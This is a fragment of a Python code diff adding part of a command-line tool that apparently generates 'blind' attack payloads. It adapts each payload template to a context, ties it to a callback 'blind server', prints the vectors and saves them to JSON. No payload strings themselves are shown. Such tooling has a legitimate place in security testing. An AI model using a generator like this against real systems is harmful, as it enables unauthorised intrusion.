+                adapted_payload = adapt_to_context(blind_payload, context)
+
+                click.echo(f"{Fore.CYAN}Vector {count}:{Style.RESET_ALL}")
+                click.echo(f"  Original: {template}")
+                click.echo(f"  Blind: {blind_payload}")
+                click.echo(f"  Context ({context}): {adapted_payload}")
+                click.echo()
+
+                results.append(
+                    {
+                        "type": ptype,
+                        "vector": count,
+                        "original": template,
+                        "blind": blind_payload,
+                        "context_adapted": adapted_payload,
+                        "context": context,
+                        "blind_server": blind_server,
+                    }
+                )
+
+        # Save results if requested
+        if save:
+            import json
+
+            output_data = {
+                "type": payload_type,
+                "context": context,
+                "blind_server": blind_server,
+                "generated_at": "2025-07-27",
+                "payloads": results,
+            }
+
+            with open(save, "w") as f:
+                json.dump(output_data, f, indent=2)
+            click.echo(
+                f"{Fore.GREEN}✅ Advanced payloads saved to {save}{Style.RESET_ALL}"
+            )
+
+        # Summary
+        click.echo(f"\n{Fore.CYAN}📊 Generation Summary:{Style.RESET_ALL}")
+        click.echo(f"  Generated: {len(results)} advanced payloads")
+        click.echo(f"  Types: {', '.join(types_to_generate)}")
+        click.echo(f"  Context: {context}")
+        click.echo(f"  Blind Server: {blind_server}")
+
+    except Exception as e:
+        click.echo(
+            f"{Fore.RED}❌ Advanced payload generation failed: {e}{Style.RESET_ALL}"
+        )
 
 
 def main():
